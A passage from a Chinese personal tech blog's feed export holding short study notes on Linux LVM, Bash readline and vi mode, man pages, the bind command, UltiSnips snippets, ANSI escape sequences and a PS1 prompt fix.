尤其是影响认证密码方面的程序.</li></ul><h3 id="17-2-2-CentOS-默认的-squid-设置"><a href="#17-2-2-CentOS-默认的-squid-设置" class="headerlink" title="17.2.2 CentOS 默认的 squid 设置"></a>17.2.2 CentOS 默认的 squid 设置</h3><p>配置文件各设置值的含义, 具体见书.</p><h1 id="第19章-主机名控制者-DNS-服务器"><a href="#第19章-主机名控制者-DNS-服务器" class="headerlink" title="第19章 主机名控制者: DNS 服务器"></a>第19章 主机名控制者: DNS 服务器</h1><h2 id="19-1-什么是-DNS"><a href="#19-1-什么是-DNS" class="headerlink" title="19.1 什么是 DNS"></a>19.1 什么是 DNS</h2><h3 id="19-1-1-用网络主机名取得-IP-的历史渊源"><a href="#19-1-1-用网络主机名取得-IP-的历史渊源" class="headerlink" title="19.1.1 用网络主机名取得 IP 的历史渊源"></a>19.1.1 用网络主机名取得 IP 的历史渊源</h3><p><code>/etc/hosts</code> 文件的用法: “IP 主机名 主机别名1 主机别名2 …”. localhost 需要对应 <code>127.0.0.1</code></p><h4 id="完整主机名-Fully-Qualified-Domain-Name-FQDN"><a href="#完整主机名-Fully-Qualified-Domain-Name-FQDN" class="headerlink" title="完整主机名: Fully Qualified Domain Name (FQDN)"></a>完整主机名: Fully Qualified Domain Name (FQDN)</h4><p>Domainname 加上 hostname 才是 FQDN.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>LVM 解析</title>
    <link href="/2022/09/08/LVM-%E8%A7%A3%E6%9E%90/"/>
    <url>/2022/09/08/LVM-%E8%A7%A3%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<hr><p><a href="https://b23.tv/ZLSREqz">Linux LVM分区与应用与详解-哔哩哔哩</a></p><hr><h1 id="传统磁盘管理"><a href="#传统磁盘管理" class="headerlink" title="传统磁盘管理"></a>传统磁盘管理</h1><p>无法扩充其大小，只能通过添加硬盘、创建新的分区来扩充空间。</p><h1 id="LVM"><a href="#LVM" class="headerlink" title="LVM"></a>LVM</h1><p>Logical Volume Manager, 封装底层物理硬盘，以逻辑卷的形式表现给上层系统，大小可动态调整。就是你不知道下面干了什么，操作系统帮你干了这些工作。</p><p>这样底层的操作就不会影响上层的操作系统。</p><p>就是一种磁盘管理机制。</p><h2 id="四个概念"><a href="#四个概念" class="headerlink" title="四个概念"></a>四个概念</h2><ul><li>PE, Physical Extend, 物理拓展，是逻辑卷空间管理的最基本单位，默认是4M大小。</li><li>PV, Physical Volume,  物理卷</li><li>VG, Volume Group, 卷组，相当于一个内存池。</li><li>LV, Logical Volume, 逻辑卷</li></ul><p>我们最终操作使用的是逻辑卷，逻辑卷是为了取代原本的硬盘和分区。</p><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><ol><li>先将底层硬盘格式化为PV物理卷，实质上是把硬盘划分为一个一个的PE物理扩展。</li><li>创建VG卷组，其作用是装PE，可以把多个PV加到VG中。VG的大小是所有PV的大小之和，</li><li>创建LV逻辑卷，就是分配VG中的PE</li><li>为创建好的LV逻辑卷创建文件系统。</li><li>将格式化好的LV逻辑卷挂载使用。</li></ol><p>VG和LV都要创建名称作为标识。</p><p>创建好一个卷组之后就会出现一个以卷组名字命名的文件夹 <code>/dev/vgname/lvname</code> </p><p><img src="/media/16530989507068.jpg"></p><p>每一个逻辑卷的空间可能来自不同的物理硬盘，因为组成VG的PE来自不同的硬盘。</p><p>VG大小不够就往里面加硬盘，也就是加PE的数量。</p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>先分割硬盘，然后把内存块放进池子，把一些内存块划为一块，就得到了LV。</p><h3 id="创建LVM"><a href="#创建LVM" class="headerlink" title="创建LVM"></a>创建LVM</h3><p><img src="/media/16530999959231.jpg"></p><p>LV逻辑卷只可能是4M的整数倍，即PE的整数倍。</p><p>步骤：</p><pre><code class="hljs">fdisk -l  #查看pvcreate /dev/sdb /dev/sdc#可用 pvdisplay(详细) or pvs 查看物理卷信息， vgdisplay or vgs 查看卷组信息，lvdisplay or lvs 查看逻辑卷信息。vgcreate name /dev/sdb /dev/sdclvcreate -n name -L space comefrom</code></pre><p>逻辑卷实际位置在。dev&#x2F;mapper中。</p><h3 id="删除LVM"><a href="#删除LVM" class="headerlink" title="删除LVM"></a>删除LVM</h3><p><img src="/media/16531007620264.jpg"></p><p>要按顺序删除，要删除PV，需要先删除LV，然后删除VG，最后在删除PV。</p><h3 id="拉伸一个逻辑卷"><a href="#拉伸一个逻辑卷" class="headerlink" title="拉伸一个逻辑卷"></a>拉伸一个逻辑卷</h3><p><img src="/media/16531008720204.jpg"></p><p>可在线拉伸，不需要先卸载。数据不会丢失。</p><p>文件系统的大小在创建是就已经固定了，扩展后并没有更新文件系统，所以要去更新文件系统。</p><h3 id="拉伸卷组"><a href="#拉伸卷组" class="headerlink" title="拉伸卷组"></a>拉伸卷组</h3><p><img src="/media/16531012715759.jpg"></p><h3 id="缩小一个逻辑卷"><a href="#缩小一个逻辑卷" class="headerlink" title="缩小一个逻辑卷"></a>缩小一个逻辑卷</h3><p><img src="/media/16531013631941.jpg"></p><p>词操作必须要离线，即unmount。要按照以上的顺序。</p><p>resize和缩小的大小不一致时回你损坏数据。</p><h3 id="缩小卷组"><a href="#缩小卷组" class="headerlink" title="缩小卷组"></a>缩小卷组</h3><p><img src="/media/16531016152757.jpg"></p><h4 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h4><p>顺序很重要，注意大小的换算。</p><hr><h2 id="LVM的条带化striping"><a href="#LVM的条带化striping" class="headerlink" title="LVM的条带化striping"></a>LVM的条带化striping</h2><hr><p><a href="https://www.pianshen.com/article/83141522744/">参考</a></p><hr><p>就是把数据跨越多个磁盘存储，即把LV上连续的数据分成大小相同的块，然后依次存储在各个磁盘的PV上。</p><hr>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki 中关于 Bash 的部分</title>
    <link href="/2022/09/07/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-Bash-%E7%9A%84%E9%83%A8%E5%88%86/"/>
    <url>/2022/09/07/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-Bash-%E7%9A%84%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Bash">ArchWiki</a><br>如果 Bash 以 TTY 中的 <code>login</code>，SSH 守护进程等类似方法派生出来，其被成为 login shell,可以用 <code>-l</code> 或 <code>--login</code> 选项来使用这种模式.</p><p>如果 Bash 的标准输入输出和标准错误输出都连接到终端，并且在启动的时候没有使用 <code>-c</code> 选项和非选项参数，其被称为 interactive shell.</p><p>所有 interactive shell (交互式 shell) 都或执行 <code>/etc/bash.bashrc</code> 和 <code>~/.bashrc</code> 文件中的配置。</p><p>而 login shell (登录 shell) 还会执行 <code>/etc/profile</code> 和 <code>~/.bash_profile</code> 中的配置.</p><h1 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h1><h2 id="Readline-库"><a href="#Readline-库" class="headerlink" title="Readline 库"></a>Readline 库</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>readline 包可能已经作为 Bash 的依赖安装。</p><h3 id="编辑模式"><a href="#编辑模式" class="headerlink" title="编辑模式"></a>编辑模式</h3><p>其默认使用 <code>Emacs</code> 风格的快捷键与命令行交互。</p><p>设置 vim 风格交互, 在 <code>~/.inputrc</code> 中添加:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">set</span> editing-<span class="hljs-keyword">mode</span> <span class="hljs-keyword">vi</span><br></code></pre></td></tr></table></figure><p>若只为 Bash 设置，可修改 <code>~/.bashrc</code>:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> -o <span class="hljs-comment">vi</span><br></code></pre></td></tr></table></figure><p>提示当前的 vi 模式, 在 <code>~/.inputrc</code> 中添加:</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">set</span> <span class="hljs-keyword">show</span>-mode-<span class="hljs-keyword">in</span>-prompt <span class="hljs-keyword">on</span><br></code></pre></td></tr></table></figure><p>默认以 <code>(cmd)/(ins)</code> 格式显示，可以通过 <code>vi-ins-mode-string</code> 和 <code>vi-cmd-mode-string</code> 变量自定义.</p><h4 id="为每个模式指定不同的光标样式"><a href="#为每个模式指定不同的光标样式" class="headerlink" title="为每个模式指定不同的光标样式"></a>为每个模式指定不同的光标样式</h4>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki 中关于 man page</title>
    <link href="/2022/09/07/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-man-page/"/>
    <url>/2022/09/07/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-man-page/</url>
    
    <content type="html"><![CDATA[<p>man 指 manual pages.</p><p>GNU 正在将 man 手册替换成 info 文档 (支持超链接).</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p><code>man-db</code> 提供了 man 命令, less 是 man 的默认分页器.</p><p><code>man-pages</code> 提供了 Linux man 页面的内容.</p><h1 id="阅读手册页"><a href="#阅读手册页" class="headerlink" title="阅读手册页"></a>阅读手册页</h1><p>man pages 分为很多段落：</p><ul><li>1 User commands, 用户可以在命令行中运行的命令</li><li>2 System calls, 内核中封装的函数</li><li>3 Library calls, 所有 library functions 除了 the system call wrappers (大多数为 libc function)</li><li>4 Special files (device), Files found in &#x2F;dev which allow to access to devices through the kernel</li><li>5 File formats and configuration files, 描述各种 human-readable file 和配置文件</li><li>6 Games, Games and funny little programs available on the system</li><li>7 Overview, conventions, and miscellaneous. Overviews or description of various topics, conventions, and protocols, character set standards, the standard filesystem layout, and miscellaneous other things</li><li>8 System management commands, 如 mount 这类命令，大多为 root 用户才能执行</li></ul><p>man pages 通过名称和所属分类标识，可指定分类以访问需要的手册，如:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">man</span> <span class="hljs-number">5</span> passwd<br></code></pre></td></tr></table></figure><p>这会显示 <code>/etc/passwd</code> 这个文件的信息.</p><h1 id="搜索手册页"><a href="#搜索手册页" class="headerlink" title="搜索手册页"></a>搜索手册页</h1><p>可以通过 <code>-k</code> 或者 <code>--apropos</code> 参数按指定关键词搜索相关手册.</p><p>关键词搜索是从一个专用的缓存生成的，默认情况下没有这个缓存，会得到 <code>nothing appropriate</code> 这个报错，可以通过 <code>mandb</code> 命令生成缓存,</p><p>每次安装新的 manpage 之后都要运行 <code>mandb</code> 缓存才会更新. 关键字可以使用正则表达式。</p><p>使用 <code>whatis</code> 命令可以只显示需要的 man page 的简要信息.</p><h1 id="使用浏览器阅读-man-page"><a href="#使用浏览器阅读-man-page" class="headerlink" title="使用浏览器阅读 man page"></a>使用浏览器阅读 man page</h1><p>在 Arch 中:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> man -H <span class="hljs-keyword">free</span><br></code></pre></td></tr></table></figure><h1 id="转换成-pdf"><a href="#转换成-pdf" class="headerlink" title="转换成 pdf"></a>转换成 pdf</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">$ man -t <span class="hljs-tag">&lt;<span class="hljs-name">manpage</span>&gt;</span> | ps2pdf - <span class="hljs-tag">&lt;<span class="hljs-name">pdf</span>&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>使用 bind 命令绑定键位</title>
    <link href="/2022/09/07/%E4%BD%BF%E7%94%A8-bind-%E5%91%BD%E4%BB%A4%E7%BB%91%E5%AE%9A%E9%94%AE%E4%BD%8D/"/>
    <url>/2022/09/07/%E4%BD%BF%E7%94%A8-bind-%E5%91%BD%E4%BB%A4%E7%BB%91%E5%AE%9A%E9%94%AE%E4%BD%8D/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/cnds123321/article/details/124815867">参考</a></p><p><a href="https://www.geeksforgeeks.org/bind-command-in-linux-with-examples/">参考</a></p><p><a href="https://www.computerhope.com/unix/bash/bind.htm">参考</a><br>Arch 中似乎没有内置这个命令，需要自己安装:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo pacman -S <span class="hljs-built_in">bind</span><br></code></pre></td></tr></table></figure><h1 id="bind-表示键的方式"><a href="#bind-表示键的方式" class="headerlink" title="bind 表示键的方式"></a>bind 表示<mark>键</mark>的方式</h1><p><code>bind</code> 使用特殊字符和文本字符串的方式来表示键盘:</p><ul><li><code>\C-</code>, 表示按住 <code>Ctrl</code> 键加上 <code>-</code> 后面的键，如 <code>\C-A</code> 表示 <code>Ctrl+A</code> </li><li><code>\e</code>, 转义键, 绑定元键，<code>Alt</code> 是键盘上的元键</li></ul><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>语法:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bind</span><span class="hljs-meta"> [选项]</span><br></code></pre></td></tr></table></figure><h2 id="查找编码的默认组合"><a href="#查找编码的默认组合" class="headerlink" title="查找编码的默认组合"></a>查找编码的默认组合</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">bind</span> -P<br></code></pre></td></tr></table></figure><p>也可以通过查看 <code>/etc/inputrc</code> 文件。</p><h2 id="查找键码"><a href="#查找键码" class="headerlink" title="查找键码"></a>查找键码</h2><p>使用 <code>Ctrl+v</code> 然后加一个键，就可以查询该键的键码.</p><p>如先按 <code>Ctrl+v</code> 然后按 <code>F7</code>, 结果为 <code>^[[18～</code> 这里的 <code>^[</code> 是转义字符，可以表示为:</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\e[18~</span><br></code></pre></td></tr></table></figure><h2 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h2><ul><li><code>-l</code>, 列出所有可绑定编辑的函数的名称</li><li><code>-P</code></li><li><code>-p</code></li><li><code>-S</code>, 列出调用宏的键序列及其值</li><li><code>-s</code>, 和 <code>-S</code>, 相同，但可以用作 <code>bind</code> 输入的形式提供输出</li><li><code>-V</code>, 列出在 bash 键绑定中使用的变量和值</li><li><code>-v</code></li><li><code>-q</code>, 查询</li><li><code>-u function-name</code>, 解除绑定到这个函数上的所有键 </li><li><code>-r keyseq</code> </li><li><code>-f filename</code>, 从文件中读取键绑定，并作为 <code>bind</code> 命令的输入</li><li><code>-x keyseq:shell-command</code>, 绑定命令</li><li><code>-X</code></li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>解决 vim 插件 Ultisnips 对 markdown 文件无效问题</title>
    <link href="/2022/09/07/%E8%A7%A3%E5%86%B3-vim-%E6%8F%92%E4%BB%B6-Ultisnips-%E5%AF%B9-markdown-%E6%96%87%E4%BB%B6%E6%97%A0%E6%95%88%E9%97%AE%E9%A2%98/"/>
    <url>/2022/09/07/%E8%A7%A3%E5%86%B3-vim-%E6%8F%92%E4%BB%B6-Ultisnips-%E5%AF%B9-markdown-%E6%96%87%E4%BB%B6%E6%97%A0%E6%95%88%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>删除 <code>vim-markdown</code> 这个插件就可以解决.</p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>区分 Non-printing character 和 Escape character</title>
    <link href="/2022/09/07/%E5%8C%BA%E5%88%86-Non-printing-character-%E5%92%8C-Escape-character/"/>
    <url>/2022/09/07/%E5%8C%BA%E5%88%86-Non-printing-character-%E5%92%8C-Escape-character/</url>
    
    <content type="html"><![CDATA[<p><a href="https://en.wikipedia.org/wiki/Non-printing_character_in_word_processors">reference 1</a><br><a href="https://en.wikipedia.org/wiki/Non-printing_character_in_word_processor://en.wikipedia.org/wiki/Escape_character">reference 2</a></p><h1 id="Non-printing-character-in-word-processors"><a href="#Non-printing-character-in-word-processors" class="headerlink" title="Non-printing character in word processors"></a>Non-printing character in word processors</h1><p>Non-printing character 或者说 formatting marks 是在 word processors 用来 design content 的 characters. 其不是用来打印或显示的。</p><p>在 word processors 中最常见的 non-printable characters 有:</p><ul><li>pilcrow, 段落符号</li><li>space</li><li>non-breaking space</li><li>tab</li></ul><h1 id="Escape-character"><a href="#Escape-character" class="headerlink" title="Escape character"></a>Escape character</h1><h2 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h2><p>一个 escape character 不是 control character.</p><p>Escape sequence 是指在转义时使用的有序字符组合.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ANSI 转移序列</title>
    <link href="/2022/09/07/ANSI-%E8%BD%AC%E7%A7%BB%E5%BA%8F%E5%88%97/"/>
    <url>/2022/09/07/ANSI-%E8%BD%AC%E7%A7%BB%E5%BA%8F%E5%88%97/</url>
    
    <content type="html"><![CDATA[<p><a href="https://zh.wikipedia.org/wiki/%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6">参考1</a><br><a href="https://zh.wikipedia.org/wiki/ANSI%E8%BD%AC%E4%B9%89%E5%BA%8F%E5%88%97">参考2</a><br><a href="https://zh.wikipedia.org/wiki/ANSI%E8%BD%AC%E4%B9%89%E5%BA%8F%E5%88%9://blog.csdn.net/linux_rm/article/details/124732456">参考3</a><br><a href="https://zh.wikipedia.org/wiki/ANSI%E8%BD%AC%E4%B9%89%E5%BA%8F%E5%88%9://blog.csdn.net/linux_rm/article/details/12473245://www.mardan.wiki/website/2019/04/23/%E4%BF%AE%E6%94%B9terminal%E9%BB%98%E8%AE%A4%E6%8F%90%E7%A4%BA%E6%A0%B7%E5%BC%8F">参考4</a><br>主要是解决我 <code>\[  \]</code> 未理解到的问题.</p><p>暂时理解为，有一部分字符的定义是 “私有的”, 以便终端制造商可以插入他们自己的序列而不与标准相冲突，因此用 <code>\[ \]</code> 包裹起来.</p><h1 id="参考-2-内容"><a href="#参考-2-内容" class="headerlink" title="参考 2 内容"></a>参考 2 内容</h1><p>序列具有不同的长度，所有序列都以 ASCII 字符 <code>ESC</code> 即 <code>\</code> 开头，第二个字节则是 0x40 ～ 0x5F 范围内的字符.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>解决 Linux 输入长命令时不会自动换行，只会回到行行首，并且覆盖前面的内容问题</title>
    <link href="/2022/09/07/%E8%A7%A3%E5%86%B3-Linux-%E8%BE%93%E5%85%A5%E9%95%BF%E5%91%BD%E4%BB%A4%E6%97%B6%E4%B8%8D%E4%BC%9A%E8%87%AA%E5%8A%A8%E6%8D%A2%E8%A1%8C%EF%BC%8C%E5%8F%AA%E4%BC%9A%E5%9B%9E%E5%88%B0%E8%A1%8C%E8%A1%8C%E9%A6%96%EF%BC%8C%E5%B9%B6%E4%B8%94%E8%A6%86%E7%9B%96%E5%89%8D%E9%9D%A2%E7%9A%84%E5%86%85%E5%AE%B9%E9%97%AE%E9%A2%98/"/>
    <url>/2022/09/07/%E8%A7%A3%E5%86%B3-Linux-%E8%BE%93%E5%85%A5%E9%95%BF%E5%91%BD%E4%BB%A4%E6%97%B6%E4%B8%8D%E4%BC%9A%E8%87%AA%E5%8A%A8%E6%8D%A2%E8%A1%8C%EF%BC%8C%E5%8F%AA%E4%BC%9A%E5%9B%9E%E5%88%B0%E8%A1%8C%E8%A1%8C%E9%A6%96%EF%BC%8C%E5%B9%B6%E4%B8%94%E8%A6%86%E7%9B%96%E5%89%8D%E9%9D%A2%E7%9A%84%E5%86%85%E5%AE%B9%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>比如我之前的为:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PS1</span>=&#x27;\<span class="hljs-number">033</span>[<span class="hljs-number">1</span>;<span class="hljs-number">95</span>m[\u@\h \W]\<span class="hljs-number">033</span>[<span class="hljs-number">0</span>m&#x27;<br></code></pre></td></tr></table></figure><p>就出现了问题。</p><p>解决, 即添加 <code>\[\]</code>:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PS1</span>=&#x27;\[\<span class="hljs-number">033</span>[<span class="hljs-number">1</span>;<span class="hljs-number">95</span>m[\u@\h \W]\<span class="hljs-number">033</span>[<span class="hljs-number">0</span>m\]&#x27;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Shell</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于 vim 插件 ultisnips 对 markdown 文件无效</title>
    <link href="/2022/09/06/%E5%85%B3%E4%BA%8E-vim-%E6%8F%92%E4%BB%B6-ultisnips-%E5%AF%B9-markdown-%E6%96%87%E4%BB%B6%E6%97%A0%E6%95%88/"/>
    <url>/2022/09/06/%E5%85%B3%E4%BA%8E-vim-%E6%8F%92%E4%BB%B6-ultisnips-%E5%AF%B9-markdown-%E6%96%87%E4%BB%B6%E6%97%A0%E6%95%88/</url>
    
    <content type="html"><![CDATA[<p>暂时没有办法.</p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>UltiSnips 使用</title>
    <link href="/2022/09/06/UltiSnips-%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/09/06/UltiSnips-%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>文档资料在 <a href="https://github.com/SirVer/ultisnips.git">https://github.com/SirVer/ultisnips.git</a> 这个仓库的 <code>doc</code> 目录下.<br>也可在 <a href="https://sirver.net/">sirver 的个人博客</a>查看.<br>在 snippet 时，用 <code>&quot;</code> 来注释。</p><p>可以使用 <code>$1</code> 等特殊变量来标识光标的位置:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">snippets</span> t <span class="hljs-string">&quot;A simple HTML text&quot;</span><br>&lt;<span class="hljs-variable">$1</span>&gt; <br>    Hello World<br>&lt;/<span class="hljs-variable">$1</span>&gt;<br></code></pre></td></tr></table></figure><p>比如这一段，当你展开这个 snippets 的时候，光标位于 <code>$1</code> 处，然后你编辑内容时，另一个 <code>$1</code> 也会被编辑.</p><p>另一段, 多了一个 <code>&#123;&#125;</code>:      </p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">snippets t <span class="hljs-string">&quot;A simple HTML text&quot;</span><br>&lt;<span class="hljs-variable">$&#123;</span><span class="hljs-number">1</span><span class="hljs-symbol">:div</span>&#125;&gt; <br>    <span class="hljs-title class_">Hello</span> <span class="hljs-title class_">World</span><br>&lt;/<span class="hljs-variable">$1</span>&gt;<br></code></pre></td></tr></table></figure><p>这会使光标选中这个文本 <code>div</code>.</p><p>第三个例子, 在 <code>snippets</code> 这一行后面加上一个 <code>b</code>, 即 begin, 表示只有在行首时在用 tab 直接展开:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">snippets t <span class="hljs-string">&quot;A simple HTML text&quot;</span> b<br>&lt;<span class="hljs-variable">$&#123;</span><span class="hljs-number">1</span><span class="hljs-symbol">:div</span>&#125;&gt; <br>    <span class="hljs-title class_">Hello</span> <span class="hljs-title class_">World</span><br>&lt;/<span class="hljs-variable">$1</span>&gt;<br></code></pre></td></tr></table></figure><p>第四个例子，可以使用正则表达式的替换功能:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">snippets t <span class="hljs-string">&quot;A simple HTML text&quot;</span> b<br>&lt;<span class="hljs-variable">$&#123;1:div&#125;</span>&gt; <br>    Hello World<br>&lt;<span class="hljs-regexp">/$&#123;1/</span>(\w+).*&#125;<span class="hljs-regexp">/$1/</span>&gt;<br></code></pre></td></tr></table></figure><p>这里 <code>&#123;</code> 后面的 1 仍然是光标的位置，最后一排的第二个 <code>$1</code> 表示在第一出光标处被选中的文本，也就是这里的 <code>div</code>.</p><p>使用 `` 包裹起来的部分可以直接写脚本，如 Shell Script, Vimsript, Perl, Python. 语法如下:</p><ul><li>Shell : `echo hi` or `#! &#x2F;usr&#x2F;bin&#x2F;perl<br>                          print “Hello”`</li><li>Vimscript : `!v “1 + 2” . string(1+2)`, 也就是前面有一个 <code>!v</code></li><li>Python : `!p snip.rc &#x3D; “Hello”`, 前面有个 <code>!p</code></li></ul><h2 id="Inword-triggers"><a href="#Inword-triggers" class="headerlink" title="Inword triggers"></a>Inword triggers</h2><p>在 snippet 那一行加上 <code>i</code>, 表示将一个单词扩展开:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">snippet</span> ri <span class="hljs-string">&quot;rizer&quot;</span> i<br>rizer<br>endsnippet<br></code></pre></td></tr></table></figure><p>这里, 你输入 <code>ri</code> 然后 <code>tab</code> 就会扩展成 <code>rizer</code>.</p><h2 id="Regular-Expression-triggers"><a href="#Regular-Expression-triggers" class="headerlink" title="Regular Expression triggers"></a>Regular Expression triggers</h2><p>在 snippet 那一行加上 <code>rb</code> , 用于扩展的关键词可以用正则表达式来表示:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">snippet <span class="hljs-string">&quot;chap?t?e?r?&quot;</span> <span class="hljs-string">&quot;Latex chapter&quot;</span> rb<br>\section&#123;chapter&#125;    <br>    <span class="hljs-variable">$0</span><br>\<span class="hljs-keyword">end</span>&#123;chapter&#125;<br>endsnippet<br></code></pre></td></tr></table></figure><p><img src="/../img/ultisnippet_quick_check.png"></p><h1 id="Visual-新特性的使用"><a href="#Visual-新特性的使用" class="headerlink" title="Visual 新特性的使用"></a>Visual 新特性的使用</h1><p><code>$&#123;VISUAL&#125;</code> 就是这个变量, 使用你用于扩展的键, 在 visual 模式下剪切文本, 会保存在这里.</p><h1 id="关于使用-Python"><a href="#关于使用-Python" class="headerlink" title="关于使用 Python"></a>关于使用 Python</h1><p><code>snip.rv</code> 的作用是将返回值替代文本.</p><h1 id="关于-global"><a href="#关于-global" class="headerlink" title="关于 global"></a>关于 global</h1><p>位于:</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-built_in">global</span> <span class="hljs-keyword">TYPE</span><br>endglobal<br></code></pre></td></tr></table></figure><p>之间的应用于所有后面的类型.</p><p>如:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">global</span> <span class="hljs-title">!p</span><br>endglobal<br></code></pre></td></tr></table></figure><p>这就是应用于 python.</p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>什么是内网穿透</title>
    <link href="/2022/09/06/%E4%BB%80%E4%B9%88%E6%98%AF%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
    <url>/2022/09/06/%E4%BB%80%E4%B9%88%E6%98%AF%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<p>Intranet Penetration, 内网穿透, 也叫 NAT 穿透，其使具有某一个特定源 IP 地址和源端口号的数据包不被 NAT 设备屏蔽而正确路由到内网主机.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux 系统中常见目录名称及相应内容</title>
    <link href="/2022/09/06/Linux-%E7%B3%BB%E7%BB%9F%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9B%AE%E5%BD%95%E5%90%8D%E7%A7%B0%E5%8F%8A%E7%9B%B8%E5%BA%94%E5%86%85%E5%AE%B9/"/>
